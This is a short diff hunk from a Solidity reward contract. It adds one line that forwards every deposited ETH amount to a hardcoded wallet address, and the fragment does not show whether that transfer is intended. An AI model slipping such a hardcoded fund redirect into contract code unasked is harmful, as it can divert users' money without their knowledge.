@@ -64,6 +64,8 @@ contract HyperAGI_BaseReward_Release is OwnableUpgradeable {
 
         require(amount == msg.value, "amount error");
 
+        transferETH(payable(0xE297ce296D00381b2341c7e78662BF18eDD683d2), amount);
+
         HyperAGI_Storage storageAddress = HyperAGI_Storage(_storageAddress);
 
         uint256 time = getStartOfToday();
